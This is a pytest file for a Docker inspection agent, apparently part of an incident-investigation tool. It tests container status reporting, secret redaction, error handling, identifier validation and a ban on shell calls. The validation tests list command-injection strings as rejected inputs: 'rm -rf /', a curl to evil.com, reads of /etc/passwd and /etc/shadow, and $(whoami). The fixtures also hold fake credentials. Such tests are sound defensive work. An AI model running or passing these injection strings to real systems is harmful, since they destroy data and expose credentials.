"""Tests for DockerAgent and DockerInspector."""

from __future__ import annotations

import os
import subprocess
import uuid
from typing import Any

import pytest

from orchestrator.agents.docker_agent import DockerAgent
from orchestrator.agents.docker_inspector import (
    DockerConnectionError,
    DockerNotFoundError,
    DockerSecurityError,
    DockerTimeoutError,
    FakeDockerInspector,
    validate_docker_identifier,
)
from orchestrator.core.context import InvestigationContext
from orchestrator.core.result import ExecutionStatus


@pytest.fixture
def fake_inspector() -> FakeDockerInspector:
    containers = [
        {
            "Id": "c1_healthy_123456",
            "Names": ["/web-api"],
            "Image": "devdoc/web-api:v1.2",
            "State": {
                "Status": "running",
                "Running": True,
                "ExitCode": 0,
                "OOMKilled": False,
                "StartedAt": "2026-10-02T10:00:00Z",
            },
            "Config": {"Image": "devdoc/web-api:v1.2"},
            "HostConfig": {"NetworkMode": "bridge"},
            "RestartCount": 0,
        },
        {
            "Id": "c2_crashing_789012",
            "Names": ["/background-worker"],
            "Image": "devdoc/worker:v1.2",
            "State": {
                "Status": "exited",
                "Running": False,
                "ExitCode": 137,
                "OOMKilled": True,
                "StartedAt": "2026-10-02T10:00:00Z",
                "FinishedAt": "2026-10-02T10:15:00Z",
            },
            "Config": {
                "Image": "devdoc/worker:v1.2",
                "Env": ["ENV=prod", "DATABASE_URL=postgres://user:super_secret_pw@db:5432/main"],
            },
            "HostConfig": {"NetworkMode": "bridge"},
            "RestartCount": 4,
        },
    ]
    logs = {
        "c1_healthy_123456": "Starting web server on port 8000...\nReady to accept connections.",
        "c2_crashing_789012": "Processing queue...\nOut of Memory! Process killed.\nFatal error.",
    }
    return FakeDockerInspector(containers=containers, logs=logs)


@pytest.fixture
def base_context() -> InvestigationContext:
    return InvestigationContext(
        investigation_id=uuid.uuid4(),
        incident_id=uuid.uuid4(),
        project_id=uuid.uuid4(),
        execution_metadata={},
    )


@pytest.mark.asyncio
async def test_docker_agent_list_all_containers(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
) -> None:
    agent = DockerAgent(inspector=fake_inspector)
    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.SUCCESS
    assert result.source == "docker"
    assert len(result.data["containers"]) == 2
    assert any("non-running" in w.lower() for w in result.warnings)
    assert result.output_metadata["container_count"] == 2


@pytest.mark.asyncio
async def test_docker_agent_inspect_specific_target(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
) -> None:
    base_context.execution_metadata["container_id"] = "c2_crashing_789012"
    agent = DockerAgent(inspector=fake_inspector)
    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.SUCCESS
    containers = result.data["containers"]
    assert len(containers) == 1
    c = containers[0]
    assert c["id"] == "c2_crashing_789012"
    assert c["state"]["oom_killed"] is True
    assert c["state"]["exit_code"] == 137
    assert c["restart_count"] == 4
    assert "Out of Memory" in c["logs"]

    # Verify warnings were raised for OOM/exit_code and restart count
    assert any("non-zero exit state" in w for w in result.warnings)
    assert any("restarted 4 times" in w for w in result.warnings)


@pytest.mark.asyncio
async def test_docker_agent_redacts_credentials_in_logs_and_config(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
) -> None:
    base_context.execution_metadata["container_id"] = "c2_crashing_789012"
    # Seed a log containing a secret token
    fake_inspector.logs["c2_crashing_789012"] = "Exported GITHUB_TOKEN=ghp_secrettoken123456789012345678901234"

    agent = DockerAgent(inspector=fake_inspector)
    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.SUCCESS
    logs = result.data["containers"][0]["logs"]
    assert "ghp_" not in logs
    assert "[REDACTED]" in logs


@pytest.mark.asyncio
async def test_docker_agent_connection_error(base_context: InvestigationContext) -> None:
    inspector = FakeDockerInspector(should_fail_connection=True)
    agent = DockerAgent(inspector=inspector)

    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.FAILED
    assert "daemon unavailable" in (result.error_message or "").lower()
    assert result.output_metadata["error"] == "docker_daemon_unavailable"


@pytest.mark.asyncio
async def test_docker_agent_timeout(base_context: InvestigationContext) -> None:
    inspector = FakeDockerInspector(should_timeout=True)
    agent = DockerAgent(inspector=inspector)

    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.FAILED
    assert "timed out" in (result.error_message or "").lower()
    assert result.output_metadata["error"] == "timeout"


@pytest.mark.asyncio
async def test_docker_agent_container_not_found(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
) -> None:
    base_context.execution_metadata["container_id"] = "nonexistent_container_id"
    agent = DockerAgent(inspector=fake_inspector)

    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.FAILED
    assert "not found" in (result.error_message or "").lower()
    assert result.output_metadata["error"] == "resource_not_found"


def test_validate_docker_identifier_valid() -> None:
    assert validate_docker_identifier("my-container_1.2") == "my-container_1.2"
    assert validate_docker_identifier("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")


def test_validate_docker_identifier_malicious_rejection() -> None:
    malicious_inputs = [
        "container; rm -rf /",
        "container && curl http://evil.com",
        "container | cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "../../etc/shadow",
        "container with spaces",
        "",
        "a" * 150,  # too long
    ]
    for bad in malicious_inputs:
        with pytest.raises(DockerSecurityError):
            validate_docker_identifier(bad)


@pytest.mark.asyncio
async def test_docker_agent_security_violation_stops_execution(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
) -> None:
    base_context.execution_metadata["container_id"] = "bad; id; rm -rf /"
    agent = DockerAgent(inspector=fake_inspector)

    result = await agent.execute(base_context)

    assert result.status == ExecutionStatus.FAILED
    assert "security violation" in (result.error_message or "").lower()
    assert result.output_metadata["error"] == "security_violation"


@pytest.mark.asyncio
async def test_docker_agent_never_calls_shell_or_subprocess(
    fake_inspector: FakeDockerInspector,
    base_context: InvestigationContext,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Guarantee that subprocess and os.system are never called."""
    def disallowed_call(*args: Any, **kwargs: Any) -> Any:
        raise AssertionError("Disallowed shell/subprocess invocation attempted!")

    monkeypatch.setattr(subprocess, "Popen", disallowed_call)
    monkeypatch.setattr(subprocess, "call", disallowed_call)
    monkeypatch.setattr(subprocess, "run", disallowed_call)
    monkeypatch.setattr(os, "system", disallowed_call)

    agent = DockerAgent(inspector=fake_inspector)
    result = await agent.execute(base_context)
    assert result.status == ExecutionStatus.SUCCESS
